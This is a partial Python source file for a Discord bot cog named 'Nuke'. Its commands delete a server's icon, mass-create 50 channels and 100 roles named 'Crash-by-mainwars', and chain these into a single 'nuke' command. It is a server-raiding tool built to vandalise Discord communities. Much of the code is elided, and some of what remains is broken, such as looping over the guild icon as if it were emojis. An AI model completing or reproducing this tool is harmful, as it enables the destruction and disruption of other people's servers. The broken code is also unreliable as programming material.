...
class Nuke(commands.Cog):
	...
	@commands.command()
	async def deleteicon(self, ctx):
		if await check(ctx):
			for emoji in ctx.guild.icon:
				create_task(remove(ctx.guild.icon))
	@commands.command()
	...
	@commands.command()
	async def spamchannels(self, ctx, *, name='Crash-by-mainwars'):
		if await check(ctx):
			for i in range(50):
	...
	@commands.command()
	async def spamroles(self, ctx, *, name='Crash-by-mainwars'):
		if await check(ctx):
			for i in range(100):
	...
	async def nuke(self, ctx):
		if await check(ctx):
			...
			create_task(Nuke.deleteicon(self, ctx))
